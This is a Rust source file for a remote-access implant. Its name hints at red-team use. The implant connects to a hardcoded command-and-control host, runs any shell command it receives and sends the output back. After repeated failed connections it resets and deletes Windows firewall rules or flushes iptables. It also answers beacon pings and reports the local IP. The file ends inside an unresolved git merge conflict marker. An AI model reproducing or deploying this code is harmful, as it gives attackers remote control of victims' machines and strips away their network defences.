use std::net::TcpStream;
use std::io::Write;
use local_ip_address::local_ip;
use std::{thread, time};
use std::path::Path;
use std::env::set_current_dir;
use subprocess::Exec;
use std::process::{Command, Stdio};
use wait_timeout::ChildExt;
use std::time::Duration;
use std::io::Read;
use std::env;

fn connect(ip: &str) -> TcpStream {
    let mut x = 0;
    loop {
        print_debug("Trying to connect...");
        if x > 24{ //if after 2 minutes of no connecting, drop IP tables
            x = 0;
            if cfg!(windows){
                Exec::shell("netsh advfirewall reset").join().unwrap();
                Exec::shell("netsh advfirewall firewall delete rule name=all").join().unwrap();
                Exec::shell("netsh advfirewall set currentprofile firewallpolicy allowinbound,allowoutbound").join().unwrap();
            } else{
                //run the command and don't print the output;
                Exec::shell("iptables -F").join().unwrap();
            }
        } 
        match TcpStream::connect(ip){ //try to connect to the IP
            Ok(con) => { //if it worked, return the connection
                print_debug("Successfully Connected!");
                return con;
            },
            Err(_) => { //if it errored, re-loop
                thread::sleep(time::Duration::from_millis(5000));
                x+=1;
                print_debug("Did not connect. Waiting 5 seconds.");
                continue;
            }
        } 
    }
}

fn run_command(cmd: &str) -> String {
    let child = if !cfg!(target_os ="windows"){
        let mut child = match Command::new("/bin/sh").arg("-c").arg(cmd).stdout(Stdio::piped()).stderr(Stdio::piped()).spawn(){
            Ok(out)=>{
                out
            }
            Err(e)=>{
                return format!("{}",e);
            }
        };
        let one_sec = Duration::from_secs(3);
        match child.wait_timeout(one_sec).unwrap() {
            Some(status) => status.code(),
            None => {
                match child.kill(){
                    Ok(_)=>{
                        "Process killed."
                    }
                    Err(_)=>{
                        "Process could not be killed."
                    }
                };
                child.wait().unwrap().code()
            }
        };
        child
    } else{
        Command::new("cmd").arg("/c").arg(cmd).stdout(Stdio::piped()).stderr(Stdio::piped()).spawn().unwrap()
    };
    let mut stdout_str = String::new();
    let mut stdout = child.stdout.unwrap();
    let mut stderr_str = String::new();
    let mut stderr = child.stderr.unwrap();
    stdout.read_to_string(&mut stdout_str).unwrap();
    stderr.read_to_string(&mut stderr_str).unwrap();
    let cmd_out = format!("{}{}",stderr_str,stdout_str);
    return cmd_out;
}

fn c2(ip:&str) -> bool {
    let mut stream = connect(ip); //connects via TCP
    loop {
        print_debug("Inside main loop of C2");
        let mut buffer = [0;1024]; //set the buffer
        print_debug("Reading buffer...");
        let num_of_bytes = stream.read(&mut buffer).unwrap_or(0); //if it fails, make the buffer 0
        print_debug("Buffer read successfully");
        if num_of_bytes == 0 { //if the connection is lost
            thread::sleep(time::Duration::from_millis(2000)); //sleep for 2 seconds 
            stream = connect(ip); //connect again
            print_debug("Connection lost... Resetting");
            continue; //continue the loop
        }
        let recv = std::str::from_utf8(&buffer).unwrap().trim_matches(char::from(0)); //string of recv
        print_debug("Received Msg: ");
        print_debug(&recv);
        if recv.contains("getIP") { //if it's getIP, return the IP
        let local_ip = local_ip().unwrap(); //get the local IP
        let local_ip = format!("{}\n",local_ip); //format IP into string
        let local_ip = local_ip.as_bytes();
        stream.write(&local_ip).unwrap(); //send it
        continue;
    }
    if recv.len() > 2{
        if recv[..=1].eq("cd") { //if the first two letters are cd
            let path = Path::new(&recv[3..]); //the path is the remaining
            stream.write(match set_current_dir(path) { //write to the stream the current diretory after changing it
                Ok(_) => { //if ok, return current directory
                    let cmd_out = if cfg!(windows) {
                        Command::new("powershell").arg("-command").arg("cd").output().unwrap()
                    } else {
                        Command::new("/bin/sh").arg("-c").arg("pwd").output().unwrap()
                    };
                    format!("Current Directory: {}", std::str::from_utf8(&cmd_out.stdout).unwrap())
                }
                Err(err) => {
                    format!("{}", err)
                }
            }.as_bytes(),).unwrap();
            continue;
        } else if recv.eq("beacon_ping"){
            stream.write(b"beacon_pong").unwrap();
            continue;
        } else if recv.eq("ENDCONNECTION"){
            return false;
        }
    }
    let output = run_command(&recv); //run this
    print_debug("Command Output: ");
    print_debug(&output);
    stream.write(&output.as_bytes()).unwrap(); //send that shit
}
}

fn print_debug(msg:&str){
    let args: Vec<_> = env::args().collect();
    if args.len() > 1{
        if args[1].eq("true"){
            println!("[DEBUG] - {}",msg);
        }
    }
}

fn main(){
<<<<<<< HEAD
    let ip = "c2.notredteam.lol:25565";
    // connect_to_router();
    loop{
        print_debug("Inside main loop.");
        if !c2(&ip){
            print_debug("'ENDCONNECTION' received. Closing client.");
            break
        };
    }
}
